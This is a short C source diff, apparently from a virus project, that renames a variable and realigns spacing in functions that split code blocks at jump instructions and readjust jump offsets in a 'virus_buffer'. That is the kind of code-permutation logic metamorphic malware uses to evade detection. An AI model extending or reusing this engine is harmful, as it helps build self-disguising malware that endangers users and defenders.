@@ -30,10 +30,10 @@ bool		is_abs_jump(void *addr)
 	return (*(uint8_t*)addr == 0xe9);
 }
 
-bool		want_to_cut_clean(size_t block_length, size_t delta,
+bool		want_to_cut_clean(size_t block_length, size_t half_size,
 			uint64_t *seed)
 {
-	size_t		closeness = (block_length * 100) / delta;
+	size_t		closeness = (block_length * 100) / half_size;
 	uint64_t	rand      = random_inrange(seed, 0, 100);
 
 	return (closeness > rand);
@@ -42,10 +42,10 @@ bool		want_to_cut_clean(size_t block_length, size_t delta,
 static bool	split_ref(struct safe_ptr *ref_origin, struct safe_ptr *ref_half,
 			uint64_t *seed, bool *cut_clean)
 {
-	size_t	delta        = ref_origin->size / 2;
+	size_t	half_size    = ref_origin->size / 2;
 	size_t	block_length = 0;
 
-	while (block_length < delta)
+	while (block_length < half_size)
 	{
 		size_t	instruction = disasm_length(ref_origin->ptr + block_length, ref_origin->size - block_length);
 
@@ -54,7 +54,7 @@ static bool	split_ref(struct safe_ptr *ref_origin, struct safe_ptr *ref_half,
 		block_length += instruction;
 
 		if (is_abs_jump(ref_origin->ptr + block_length - instruction)
-		&& want_to_cut_clean(block_length, delta, seed))
+		&& want_to_cut_clean(block_length, half_size, seed))
 		{
 			*cut_clean = true;
 			break ;
@@ -271,7 +271,7 @@ static bool	adjust_jumps(struct safe_ptr virus_buffer_ref, \
 {
 	for (size_t i = 0; i < b->njumps; i++)
 	{
-		struct jump	*j = &b->jumps[i];
+		struct jump	*j      = &b->jumps[i];
 		size_t	jump_value_addr = (size_t)j->value_addr;
 		int32_t	jump_value      = j->value + j->value_shift;
 		uint8_t	jump_size       = j->value_size;
